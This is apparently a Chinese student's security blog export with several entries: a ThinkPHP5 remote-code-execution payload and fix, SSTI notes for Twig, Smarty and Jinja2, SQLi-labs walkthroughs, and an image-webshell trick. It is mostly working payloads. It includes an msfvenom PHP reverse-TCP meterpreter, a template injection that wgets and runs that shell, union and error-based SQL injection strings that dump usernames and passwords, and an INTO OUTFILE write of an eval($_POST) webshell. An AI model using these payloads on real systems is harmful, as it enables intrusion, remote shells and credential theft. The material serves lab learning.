<p><code>?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=file_put_contents&amp;vars[1][]=./test.php&amp;vars[1][]=&lt;?php%20phpinfo();?&gt;</code></p>
<p><img src="/2021/07/18/2021/src/ThinkPHP5/image-20210718191745523.png" alt="image-20210718191745523"></p>
<p>回显出了数字18，表示我们写入文件成功</p>
<p>接着进行访问</p>
<p>test.php</p>
<p><img src="/2021/07/18/2021/src/ThinkPHP5/image-20210718191940910.png" alt="image-20210718191940910"></p>
<p>出现如上页面，成功利用漏洞。</p>
<p>接着我还尝试了一句话木马的写入，答案显然，也是可以写入并利用的。</p>
<p>最后蚁剑连接即可。</p>
<p><img src="/2021/07/18/2021/src/ThinkPHP5/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(284).png"></p>
<p><img src="/2021/07/18/2021/src/ThinkPHP5/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(285).png"></p>
<p><img src="/2021/07/18/2021/src/ThinkPHP5/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(286).png"></p>
<p><img src="/2021/07/18/2021/src/ThinkPHP5/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(287).png"></p>
<p>利用完漏洞，对于我们来说最重要的学会去修复</p>
<p>接下来学习修复这个漏洞</p>
<p>1.添加一段代码到App.php的554行</p>
<p><code>if (!preg_match(&#39;/^[A-Za-z](\w)*$/&#39;, $controller)) &#123;</code></p>
<p><code>            throw new HttpException(404, &#39;controller not exists:&#39; . $controller);</code></p>
<p><code>        &#125;</code></p>
<p><img src="/2021/07/18/2021/src/ThinkPHP5/image-20210718193014082.png" alt="image-20210718193014082"></p>
<p>修改之后，使用原来的poc发现失效了</p>
<p>漏洞修复成功。</p>
<p><img src="/2021/07/18/2021/src/ThinkPHP5/image-20210718193101116.png" alt="image-20210718193101116"></p>
<h4 id="附录："><a href="#附录：" class="headerlink" title="附录："></a>附录：</h4><p>最近了解到有msf，kali已经安装了，win10下也装好了，</p>
<p>就差成功攻击一下windowsever2018 r2</p>
<p>再尝试尝试</p>
<p>8.24报告：再次使用msf框架，试图利用<strong>永恒之蓝</strong>漏洞，但始终卡在了建立session上</p>
<p>不知道是不是之前在靶机上装了360导致打了补丁。。。。</p>
<p><img src="/2021/07/18/2021/src/ThinkPHP5/image-20210825085712815.png"></p>
<p><img src="/2021/07/18/2021/src/ThinkPHP5/QQ%E5%9B%BE%E7%89%8720210825085949.png"></p>
]]></content>
      <tags>
        <tag>src</tag>
      </tags>
  </entry>
  <entry>
    <title>leak</title>
    <url>/2021/08/25/2021/src/leak/</url>
    <content><![CDATA[<p>PHP漏洞介绍</p>
<p><a href="https://www.jb51.net/article/31898.htm">https://www.jb51.net/article/31898.htm</a></p>
<p>针对php网站的主要几种攻击方式</p>
<h3 id="1-命令注入"><a href="#1-命令注入" class="headerlink" title="1.命令注入"></a>1.命令注入</h3><p><a href="https://blog.csdn.net/qq2539879928/article/details/106635907">https://blog.csdn.net/qq2539879928/article/details/106635907</a></p>
<h3 id="2-eval注入"><a href="#2-eval注入" class="headerlink" title="2.eval注入"></a>2.eval注入</h3><p>eval函数，常用：@eval($_POST[‘cmd’])</p>
<h3 id="3-客户端脚本攻击"><a href="#3-客户端脚本攻击" class="headerlink" title="3.客户端脚本攻击"></a>3.客户端脚本攻击</h3><h3 id="4-跨网站脚本攻击"><a href="#4-跨网站脚本攻击" class="headerlink" title="4.跨网站脚本攻击"></a>4.跨网站脚本攻击</h3><h3 id="5-sql注入攻击"><a href="#5-sql注入攻击" class="headerlink" title="5.sql注入攻击"></a>5.sql注入攻击</h3><h3 id="6-跨网站请求伪造攻击"><a href="#6-跨网站请求伪造攻击" class="headerlink" title="6.跨网站请求伪造攻击"></a>6.跨网站请求伪造攻击</h3><p>CSRF</p>
<h3 id="7-Session会话劫持"><a href="#7-Session会话劫持" class="headerlink" title="7.Session会话劫持"></a>7.Session会话劫持</h3><h3 id="8-Session固定攻击"><a href="#8-Session固定攻击" class="headerlink" title="8.Session固定攻击"></a>8.Session固定攻击</h3><h3 id="9-HTTP响应拆分攻击"><a href="#9-HTTP响应拆分攻击" class="headerlink" title="9.HTTP响应拆分攻击"></a>9.HTTP响应拆分攻击</h3><h3 id="10-文件上传漏洞"><a href="#10-文件上传漏洞" class="headerlink" title="10.文件上传漏洞"></a>10.文件上传漏洞</h3><p><a href="https://blog.csdn.net/weixin_44519789/article/details/116570426">https://blog.csdn.net/weixin_44519789/article/details/116570426</a></p>
<h3 id="11-目录穿越漏洞"><a href="#11-目录穿越漏洞" class="headerlink" title="11.目录穿越漏洞"></a>11.目录穿越漏洞</h3><p><a href="https://blog.csdn.net/angry_program/article/details/107855078">https://blog.csdn.net/angry_program/article/details/107855078</a></p>
<h3 id="12-远程文件包含攻击"><a href="#12-远程文件包含攻击" class="headerlink" title="12.远程文件包含攻击"></a>12.远程文件包含攻击</h3><p><a href="https://blog.csdn.net/qq_45300786/article/details/108724251">https://blog.csdn.net/qq_45300786/article/details/108724251</a></p>
<h3 id="13-动态注入函数攻击"><a href="#13-动态注入函数攻击" class="headerlink" title="13.动态注入函数攻击"></a>13.动态注入函数攻击</h3><h3 id="14-URL攻击"><a href="#14-URL攻击" class="headerlink" title="14.URL攻击"></a>14.URL攻击</h3><h3 id="15-表单提交欺骗攻击"><a href="#15-表单提交欺骗攻击" class="headerlink" title="15.表单提交欺骗攻击"></a>15.表单提交欺骗攻击</h3><h3 id="16-HTTP请求欺骗攻击"><a href="#16-HTTP请求欺骗攻击" class="headerlink" title="16.HTTP请求欺骗攻击"></a>16.HTTP请求欺骗攻击</h3><h3 id="17-模板注入"><a href="#17-模板注入" class="headerlink" title="17.模板注入"></a>17.模板注入</h3><p>(从这里找到了大佬博客：<a href="https://www.cnblogs.com/bmjoker/">https://www.cnblogs.com/bmjoker/</a>)</p>
<p><a href="https://www.cnblogs.com/bmjoker/p/13508538.html">https://www.cnblogs.com/bmjoker/p/13508538.html</a></p>
<p>模板引擎：这里特指用于Web开发的模板引擎</p>
<p>​        它可以生成特定格式的文档，利用模板引擎来生成前端的html代码，模板引擎会提供一套生成html代码的程序，然后只需要获取用户的数据，然后放到渲染函数里，然后生成模板+用户数据的前端html页面，然后反馈给浏览器，呈现在用户面前</p>
<p>ssti模板注入</p>
<p>​                            —–也称服务器端模板注入</p>
<p>当前流行框架，比如python的flask</p>
<p>php的tp，java的spring</p>
<h4 id="漏洞成因："><a href="#漏洞成因：" class="headerlink" title="漏洞成因："></a>漏洞成因：</h4><p>​        服务端接收了用户的恶意输入以后，未经任何处理就将其作为 Web 应用模板内容的一部分，模板引擎在进行目标编译渲染的过程中，执行了用户插入的可以破坏模板的语句，因而可能导致了敏感信息泄露、代码执行、GetShell 等问题。其影响范围主要取决于模版引擎的复杂性。</p>
<p>利用图表</p>
<p><img src="/2021/08/25/2021/src/leak/1344396-20200911174631687-758048107.png" alt="img"></p>
<h4 id="Twig模板"><a href="#Twig模板" class="headerlink" title="Twig模板"></a>Twig模板</h4><p>由图可以看出，在经过模板解析后的内容</p>
<p><img src="/2021/08/25/2021/src/leak/1344396-20200818195801226-981945295.png" alt="img"></p>
<p>payload（2.0）</p>
<figure class="highlight handlebars"><table><tr><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">_self.env.registerUndefinedFilterCallback</span>(<span class="hljs-name">&quot;exec&quot;</span>)&#125;&#125;</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">_self.env.getFilter</span>(<span class="hljs-name">&quot;id&quot;</span>)&#125;&#125;</span><br></code></pre></td></tr></table></figure>

<p><img src="/2021/08/25/2021/src/leak/1344396-20200818231853350-914354726.png" alt="img"></p>
<p>文章还详细介绍了使用msf通过Twig模板注入获取shell</p>
<p>使用msf生成了一个php meterpreter有效载荷</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php">msfvenom -p php/meterpreter/reverse_tcp -f raw LHOST=<span class="hljs-number">192.168</span><span class="hljs-number">.127</span><span class="hljs-number">.131</span> LPORT=<span class="hljs-number">4321</span> &gt; /<span class="hljs-keyword">var</span>/www/html/shell.txt<br></code></pre></td></tr></table></figure>

<p> <img src="/2021/08/25/2021/src/leak/1344396-20200818232520602-1757346385.png" alt="img"></p>
<p> 模板注入远程下载shell，并重命名运行</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php">&#123;&#123;_self.env.registerUndefinedFilterCallback(<span class="hljs-string">&quot;exec&quot;</span>)&#125;&#125;&#123;&#123;_self.env.getFilter(<span class="hljs-string">&quot;wget http://192.168.127.131/shell.txt </span><br></code></pre></td></tr></table></figure>

<p><img src="/2021/08/25/2021/src/leak/1344396-20200818232914668-1182705687.png" alt="img"></p>
<h4 id="Smarty模板"><a href="#Smarty模板" class="headerlink" title="Smarty模板"></a>Smarty模板</h4><p>payload</p>
<figure class="highlight css"><table><tr><td class="code"><pre><code class="hljs css">&#123;<span class="hljs-attribute">self</span>::<span class="hljs-built_in">getStreamVariable</span>(<span class="hljs-string">&quot;file:///etc/passwd&quot;</span>)&#125;<br></code></pre></td></tr></table></figure>

<p>CTF地址：<a href="https://buuoj.cn/challenges%EF%BC%88CISCN2019%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BAWeb11%EF%BC%89">https://buuoj.cn/challenges（CISCN2019华东南赛区Web11）</a></p>
<p>xff头做文章，进行注入</p>
<figure class="highlight isbl"><table><tr><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">X</span>-<span class="hljs-variable">Forwarded</span>-<span class="hljs-variable">For</span>：&#123;<span class="hljs-function"><span class="hljs-title">sysytem</span>(<span class="hljs-string">&#x27;cat /flag&#x27;</span>)&#125;</span><br></code></pre></td></tr></table></figure>

<p>这题我没有单独写文章，因为解题过程很快，知识点对应上了。</p>
<p>smarty-ssti常规利用方式</p>
<p><strong>1. {$smarty.version}</strong></p>
<figure class="highlight applescript"><table><tr><td class="code"><pre><code class="hljs applescript">&#123;$smarty.<span class="hljs-built_in">version</span>&#125;  <span class="hljs-comment">#获取smarty的版本号</span><br></code></pre></td></tr></table></figure>

<p><img src="/2021/08/25/2021/src/leak/1344396-20200820233050238-1942906786.png" alt="img"></p>
<p><strong>2. {php}{/php}</strong></p>
<figure class="highlight dust"><table><tr><td class="code"><pre><code class="hljs dust"><span class="hljs-template-variable">&#123;php&#125;</span><span class="xml">phpinfo();</span><span class="hljs-template-tag">&#123;/<span class="hljs-name">php</span>&#125;</span><span class="xml">  #执行相应的php代码</span><br></code></pre></td></tr></table></figure>

<p><img src="/2021/08/25/2021/src/leak/1344396-20200820233259128-196602210.png" alt="img"></p>
<p><strong>3. {literal}</strong></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">language</span>=<span class="hljs-string">&quot;php&quot;</span>&gt;</span>phpinfo();<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>   <br></code></pre></td></tr></table></figure>

<p><img src="/2021/08/25/2021/src/leak/1344396-20200820233719367-1535357026.png" alt="img"></p>
<p><strong>4.</strong> <strong>getstreamvariable</strong></p>
<figure class="highlight css"><table><tr><td class="code"><pre><code class="hljs css">&#123;<span class="hljs-attribute">self</span>::<span class="hljs-built_in">getStreamVariable</span>(<span class="hljs-string">&quot;file:///etc/passwd&quot;</span>)&#125;<br></code></pre></td></tr></table></figure>

<p><img src="/2021/08/25/2021/src/leak/1344396-20200820234305773-495371489.png" alt="img"></p>
<p><strong>5. {if}{/if}</strong></p>
<figure class="highlight clojure"><table><tr><td class="code"><pre><code class="hljs clojure">&#123;if phpinfo()&#125;&#123;/if&#125;<br></code></pre></td></tr></table></figure>

<p><img src="/2021/08/25/2021/src/leak/1344396-20200820234610811-341143885.png" alt="img"></p>
<p>python中的ssti</p>
<p>常见模板有：jinja2， tornado</p>
<h4 id="Jinjia2"><a href="#Jinjia2" class="headerlink" title="Jinjia2"></a>Jinjia2</h4><p>以Django的模板为模型的</p>
<p>它是flask框架的一部分，Jinja2会把模板参数提供的相应的值替换了  块。</p>
<p>Jinja2使用 结构表示一个变量，它是一种特殊的占位符，告诉模版引擎这个位置的值从渲染模版时使用的数据中获取。</p>
]]></content>
      <tags>
        <tag>src</tag>
      </tags>
  </entry>
  <entry>
    <title>11-20</title>
    <url>/2021/02/18/2021/sql/11-20/</url>
    <content><![CDATA[<h4 id="第十三关："><a href="#第十三关：" class="headerlink" title="第十三关："></a>第十三关：</h4><p>奇怪的是，我的回显和作者的不一样，直接admin’)#当用户名作万能密码。</p>
<p>SELECT username, password FROM users WHERE username=(‘admin’)#’) and password=(‘123’) LIMIT 0,1</p>
<p>但是#改成–+却不行</p>
<h4 id="第十四关：双引号"><a href="#第十四关：双引号" class="headerlink" title="第十四关：双引号"></a>第十四关：双引号</h4><p>SELECT username, password FROM users WHERE username=”admin”#” and password=”123” LIMIT 0,1</p>
<p>来自 <a href="http://127.0.0.1/sqllib/Less-14/">http://127.0.0.1/sqllib/Less-14/</a> </p>
<h4 id="第十五关"><a href="#第十五关" class="headerlink" title="第十五关:"></a>第十五关:</h4><p>SELECT username, password FROM users WHERE username=’admin’#’ and password=’123’ LIMIT 0,1</p>
<p>来自 <a href="http://127.0.0.1/sqllib/Less-15/">http://127.0.0.1/sqllib/Less-15/</a> </p>
<h4 id="第十六关："><a href="#第十六关：" class="headerlink" title="第十六关："></a>第十六关：</h4><p>SELECT username, password FROM users WHERE username=(“admin”)#”) and password=(“123”) LIMIT 0,1</p>
<p>来自 <a href="http://127.0.0.1/sqllib/Less-16/">http://127.0.0.1/sqllib/Less-16/</a> </p>
<h4 id="第十七关："><a href="#第十七关：" class="headerlink" title="第十七关："></a>第十七关：</h4><p>SELECT username, password FROM users WHERE username= ‘admin’ LIMIT 0,1</p>
<p>XPATH syntax error: ‘<del>8.0.12</del>‘</p>
<p>来自 <a href="http://127.0.0.1/sqllib/Less-17/">http://127.0.0.1/sqllib/Less-17/</a> </p>
<h4 id="第十八关："><a href="#第十八关：" class="headerlink" title="第十八关："></a>第十八关：</h4><p>Your IP ADDRESS is: 127.0.0.1</p>
<p>SELECT users.username, users.password FROM users WHERE users.username=’admin’ and users.password=1 ORDER BY users.id DESC LIMIT 0,1Your User Agent is: ‘and extractvalue(1,concat(0x7e,(select @@version),0x7e)) and ‘1’=’1</p>
<p>XPATH syntax error: ‘<del>8.0.12</del>‘</p>
<p>来自 <a href="http://127.0.0.1/sqllib/Less-18/">http://127.0.0.1/sqllib/Less-18/</a> </p>
<h4 id="第二十关："><a href="#第二十关：" class="headerlink" title="第二十关："></a>第二十关：</h4><p><strong>Issue with your mysql: XPATH syntax error: ‘~D:\phpstudy_pro\Extensions\MySQ’</strong></p>
<p>YOUR COOKIE : uname = admin1’and extractvalue(1,concat(0x7e,(select @@basedir),0x7e))# and expires: Tue 16 Feb 2021 - 13:36:07<br>Issue with your mysql: XPATH syntax error: ‘~D:\phpstudy_pro\Extensions\MySQ’</p>
<p>来自 <a href="http://127.0.0.1/sqllib/Less-20/index.php">http://127.0.0.1/sqllib/Less-20/index.php</a> </p>
]]></content>
      <tags>
        <tag>sql</tag>
      </tags>
  </entry>
  <entry>
    <title>图片马</title>
    <url>/2021/02/22/2021/upload-labs/%E5%9B%BE%E7%89%87%E9%A9%AC/</url>
    <content><![CDATA[<p>  1.打开windows命令控制台，cd到图片与文件同在路径下</p>
<p>  如 1.jpg与 2.php同在桌面，则：</p>
<p>  cd   desktop</p>
<ol start="2">
<li><p>输入指令：copy  1.jpg/b  +  2.php/a  shell,jpg   之后回车，那么形成的图片马文件就会出现在自己的桌面上。</p>
<p><img src="/2021/02/22/2021/upload-labs/%E5%9B%BE%E7%89%87%E9%A9%AC/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(38).png"></p>
<p>​    </p>
</li>
</ol>
]]></content>
      <tags>
        <tag>upload-labs</tag>
      </tags>
  </entry>
  <entry>
    <title>SQL labs1-10</title>
    <url>/2020/12/09/2021/sql/1-10/</url>
    <content><![CDATA[<h4 id="Less1：（基于错误的GET单引号字符型注入"><a href="#Less1：（基于错误的GET单引号字符型注入" class="headerlink" title="Less1：（基于错误的GET单引号字符型注入)"></a>Less1：（基于错误的GET单引号字符型注入)</h4><p>解题思路：</p>
<p><strong>方法一，union 联合查询注入</strong></p>
<p>1，首先判断是否存在注入 / ？id=1’   回显错误，去掉 ‘ 发现回显正常，发现是<strong>单引号字符型注入</strong></p>
<p><strong>注意此时因为前面报错可以看到有limit 0,1我们可以知道此处如果需要输出我们union查询出的信息要将前面的位占了，即使前面的输出为不存在。可以看到我是将id的值写为负值，然后将输出的位置就让给了后面我们需要输出的信息，这个技巧在有输出限制的时候十分重要。</strong></p>
<p>2，然后用 order by 判断有几列数据</p>
<figure class="highlight crmsh"><table><tr><td class="code"><pre><code class="hljs crmsh">/ ?id = <span class="hljs-number">1</span>&#x27; <span class="hljs-keyword">order</span> <span class="hljs-title">by</span> <span class="hljs-number">3</span> %<span class="hljs-number">23</span>  <br></code></pre></td></tr></table></figure>

<p>回显正常，order by 4 的时候发现回显错误，说明有3 列</p>
<p><strong>我们上面猜测出了字段数为3，但这里输出的只有2个，所以我们union查询要保证字段数一样，不足的补数字（只有mysql可以），或者null。然后第一个是没有输出的，所以我将需要输出的写在了后面两个。</strong></p>
<p>3，将id=1改为一个数据库不存在的id值，如-1，使用union select 1,2,3联合查询语句查看页面是否有显示位。</p>
<p>发现页面先输出了2和3，说明页面有2个显示位</p>
<p>4，然后利用sql查询语句依次爆破出数据库内的数据库名，表名，列名，字段信息</p>
<p>（1） 爆数据库名：</p>
<figure class="highlight lsl"><table><tr><td class="code"><pre><code class="hljs lsl">?id=<span class="hljs-number">-1</span>&#x27; union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(schema_name) from information_schema.schemata %<span class="hljs-number">23</span><br></code></pre></td></tr></table></figure>

<p><strong>上面的爆出全部的数据库名，\</strong>下面的爆当前的数据库名：****</p>
<figure class="highlight lsl"><table><tr><td class="code"><pre><code class="hljs lsl">?id=<span class="hljs-number">-1</span>&#x27; union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,database() %<span class="hljs-number">23</span><br></code></pre></td></tr></table></figure>

<p>（2） 爆表名：</p>
<figure class="highlight q"><table><tr><td class="code"><pre><code class="hljs q">?id=<span class="hljs-number">-1</span>&#x27; <span class="hljs-built_in">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-built_in">tables</span> <span class="hljs-built_in">where</span> table_schema=database() %<span class="hljs-number">23</span><br></code></pre></td></tr></table></figure>

<p>（3）爆字段：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql">?id=-1&#x27; union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-keyword">group_concat</span>(column_name) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name=<span class="hljs-string">&#x27;users&#x27;</span> <span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure>

<p>（4）爆内容：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql">?id=-1&#x27; union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-keyword">group_concat</span>(username,<span class="hljs-number">0x3a</span>,<span class="hljs-keyword">password</span>) <span class="hljs-keyword">from</span> <span class="hljs-keyword">users</span><span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure>

<p>0x3a 代表十六进制的 ‘ ： ’</p>
<p><strong>方法二：手动报错注入</strong></p>
<p>通过报错回显查询信息</p>
<p>1，爆数据库名：</p>
<figure class="highlight lsl"><table><tr><td class="code"><pre><code class="hljs lsl">?id=<span class="hljs-number">1</span>&#x27; and extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(database()))) --+<br></code></pre></td></tr></table></figure>

<p>2,爆表：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql">?id=1&#x27; and extractvalue(1,concat(0x7e,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">group_concat</span>(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>()))) <span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure>

<p>3，4，直接将 <strong>extractvalue(1,concat(0x7e,(……) ) )</strong>  内的内容修改即可。或者用 <strong>updatexml（1，concat(0x7e,(……),1）</strong></p>
<p><img src="/2020/12/09/2021/sql/1-10/%E6%8D%95%E8%8E%B7.PNG"></p>
<h4 id="Less-2：-GET型整型注入）"><a href="#Less-2：-GET型整型注入）" class="headerlink" title="Less 2：(GET型整型注入）"></a>Less 2：(GET型整型注入）</h4><p> 今天成功安装了hackbar的旧版本</p>
<p> 链接地址为：<a href="https://github.com/HCTYMFF/hackbar2.1.3">https://github.com/HCTYMFF/hackbar2.1.3</a> （在火狐浏览器上使用）</p>
<p> 先采用</p>
<p>?id=1 union select 1,2,3–+  发现可行</p>
<p>与之前一样，又在1后加入了分号，出现语法报错</p>
<p>删掉分号，我们修改语句</p>
<figure class="highlight crystal"><table><tr><td class="code"><pre><code class="hljs crystal">?id=<span class="hljs-number">1</span> <span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">select</span> <span class="hljs-title">group</span>(<span class="hljs-title">schema_name</span>)<span class="hljs-title">from</span> <span class="hljs-title">information_schema</span>.<span class="hljs-title">schemata</span>--+</span><br></code></pre></td></tr></table></figure>

<p>查到关于数据库内部数据</p>
<p>接着修改</p>
<p>?id=1 union select group(schema_name)from information_schema.tables where table_schema=’security’–+</p>
<p>这里建议将security修改为16进制，0x开头，英文单词用hackbar里的工具转换为16进制数</p>
<p>之后修改为username</p>
<p>得到username和password字名</p>
<p>然后同第一关一样，我们需要让它出现所有的数据</p>
<p>慢慢来</p>
<figure class="highlight crystal"><table><tr><td class="code"><pre><code class="hljs crystal">?id=<span class="hljs-number">1</span> <span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">select</span> 1,2,<span class="hljs-title">contact_ws</span>(,~<span class="hljs-title">username</span>,<span class="hljs-title">password</span>)<span class="hljs-title">from</span> <span class="hljs-title">securiy</span>.<span class="hljs-title">uesers</span>--+</span><br></code></pre></td></tr></table></figure>

<p>同样这里的~使用十六进制，修改为0x7e</p>
<p>我们再加group_concat 函数得到</p>
<figure class="highlight crystal"><table><tr><td class="code"><pre><code class="hljs crystal">?id=-<span class="hljs-number">1221</span> <span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">select</span> 1,2,<span class="hljs-title">gruop_concat</span>(<span class="hljs-title">concat_ws</span>(0<span class="hljs-title">x7e</span>,<span class="hljs-title">username</span>,<span class="hljs-title">password</span>)<span class="hljs-title">from</span> <span class="hljs-title">security</span>.<span class="hljs-title">users</span>--+</span><br></code></pre></td></tr></table></figure>

<p>tip:这边加负号是使得id=1失去作用。</p>
<p>最后回显数据，得到链接为：<a href="http://localhost/Less-2/?id=-1221">http://localhost/Less-2/?id=-1221</a> union select 1,2,group_concat(concat_ws(0x7e,username,password))from security.users–+<img src="/2020/12/09/2021/sql/1-10/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(11).png"></p>
<h4 id="Less-3-基于错误的get单引号变形字符注入"><a href="#Less-3-基于错误的get单引号变形字符注入" class="headerlink" title="Less-3 (基于错误的get单引号变形字符注入)"></a>Less-3 (基于错误的get单引号变形字符注入)</h4><p>1，输入 id=1 正常，输入id=1’ # 回显错误 ，根据报错信息确定咱们输入的内容存放到一对单引号加圆括号中了，猜想一下咱们输入1在数据库语句中的位置，形如select … from … where id=(‘1’) …，在第一题中id=1‘的后面单引号加上），其它保持不变就行了</p>
<h4 id="Less-4-基于错误的get双引号字符型注入"><a href="#Less-4-基于错误的get双引号字符型注入" class="headerlink" title="Less-4 (基于错误的get双引号字符型注入)"></a>Less-4 (基于错误的get双引号字符型注入)</h4><p>,输入 id =1 回显正常  输入 id =1’ 回显正常  输入 id = 1” 回显错误  说明是 双引号闭合型</p>
<p>输入 id = 1” %23 回显错误  说明还有一个 单括号闭合 </p>
<p>输入 id = 1”) …… 其他不变</p>
<h4 id="Less-5-双注入get单引号字符型注入"><a href="#Less-5-双注入get单引号字符型注入" class="headerlink" title="Less-5(双注入get单引号字符型注入)"></a>Less-5(双注入get单引号字符型注入)</h4><p> 第五关与前四关不同，没有了明显的回显，经过资料查询为布尔盲注（bool）</p>
<p>与之前一样我们先利用基本语句，发现id=1’时报错，存在注入；</p>
<p>之后用order by语句查询到至多只有3行；</p>
<p>但是没有了明显的回显后，我们不能再使用union select 联合查询来寻找我们要的数据；</p>
<p>这个时候就使用新的语句 and left(( select database()),1) 进行试探，或是直接进入MySQL控制台使用语句进行查询更加直观</p>
<p>这是用sqlmap跑的数据图</p>
<p><img src="/2020/12/09/2021/sql/1-10/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(12).png"></p>
<p>最后的数据为‘security’   </p>
<figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://localhost/Less-<span class="hljs-number">5</span>/?id=<span class="hljs-number">1</span>%<span class="hljs-number">27</span>%<span class="hljs-number">20</span>and%<span class="hljs-number">20</span>left%<span class="hljs-number">20</span>((select%<span class="hljs-number">20</span>database()),<span class="hljs-number">8</span>)=%<span class="hljs-number">27</span>security%<span class="hljs-number">27</span>--+<br></code></pre></td></tr></table></figure>

<p>这里推荐函数链接：：<a href="https://blog.csdn.net/qq_43573676/article/details/105774162">https://blog.csdn.net/qq_43573676/article/details/105774162</a></p>
<h4 id="Less-6-双注入get双引号字符型注入"><a href="#Less-6-双注入get双引号字符型注入" class="headerlink" title="Less-6 (双注入get双引号字符型注入)"></a>Less-6 (双注入get双引号字符型注入)</h4><p>只用将less 5 中的单引号改为 双引号即可</p>
<h4 id="Less-7-导出文件get字符型注入"><a href="#Less-7-导出文件get字符型注入" class="headerlink" title="Less-7 (导出文件get字符型注入)"></a>Less-7 (导出文件get字符型注入)</h4><p>1，补充：<br>@@basedir ：mysql安装路径</p>
<p>@@datadir ：数据库路径</p>
<p><strong>load_file(file_name)：读取文件并返回该文件的内容作为一个字符串</strong></p>
<p><strong>使用条件：必须有权限读取并且文件可读，必须指定文件完整的路径</strong></p>
<p>2，由于我不是在本地搭载的环境，所以知道具体的数据存放路径，需要去获取绝对路径，</p>
<p>前面知道 本题是 单引号 加双括号 的闭合方式：</p>
<figure class="highlight gauss"><table><tr><td class="code"><pre><code class="hljs gauss">? id=<span class="hljs-number">-1</span>&#x27;)) <span class="hljs-built_in">union</span> <span class="hljs-built_in">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-comment">@@</span>datadir --+<br></code></pre></td></tr></table></figure>

<p>获取不了 路径</p>
<p>于是去前面的简单的题找个路径：</p>
<figure class="highlight crystal"><table><tr><td class="code"><pre><code class="hljs crystal">Less-<span class="hljs-number">2</span>/?id=-<span class="hljs-number">1</span> <span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">select</span> 1,@@<span class="hljs-title">basedir</span>,@@<span class="hljs-title">datadir</span> --+</span><br></code></pre></td></tr></table></figure>

<p>得到路经：<img src="https://img-blog.csdnimg.cn/20190511131738156.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3Zoa2pod2Jz,size_16,color_FFFFFF,t_70" alt="img"></p>
<p>进行文件导入：(这里要用 \ ）</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php">?id=<span class="hljs-number">1</span><span class="hljs-string">&#x27;)) union select 1,2,&#x27;</span><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>($_POST[<span class="hljs-string">&quot;cmd&quot;</span>]);<span class="hljs-meta">?&gt;</span><span class="hljs-string">&#x27; into outfile &quot;http://43.247.91.228:84\\var\\lib\\mysql\\www\\123.php&quot;--+</span><br></code></pre></td></tr></table></figure>

<p><strong>需要注意的是：利用数据库file权限向操作系统写入文件时， 对于相同文件名的文件不能覆盖，所以如果第一次上传chao.php，下次在上传chao.php，就是无效命令了，也就是新的chao,php中的内容并不会覆盖，之前的chao.php</strong></p>
<p>然后用菜刀进行连接</p>
<p> 我自己在尝试第七关的时候，发生了很多次失败，导致sql靶场一度搁浅</p>
<p>现在想想错误应该是这几个：</p>
<p>1.没有//，因为遇到转义时需用//才能使得浏览器解析时为我们自己想要的。</p>
<p>2.格式没有完全对，之前借鉴的博客里可能有一些问题（无意冒犯一些大佬）。</p>
<p>3.对于什么是一句话木马没有一点了解，就连工具antsword也是装了很久才成功。</p>
<h4 id="Less-8-布尔型单引号GET盲注"><a href="#Less-8-布尔型单引号GET盲注" class="headerlink" title="Less-8 (布尔型单引号GET盲注)"></a>Less-8 (布尔型单引号GET盲注)</h4><p>1，补充：</p>
<p><strong>（1）盲注分为两类：<br>　　　　1.布尔盲注　布尔很明显Ture跟Fales，也就是说它只会根据　你的注入信息返回Ture跟Fales，也就没有了之前的报错信息。<br>　　　　2.时间盲注　界面返回值只有一种,true 无论输入任何值 返回情况都会按正常的来处理。加入特定的时间函数，通过查看web页面返回的时间差来判断注入的语句是否正确。</strong></p>
<p>（2）</p>
<p>–batch ： 让sqlmap自动输入</p>
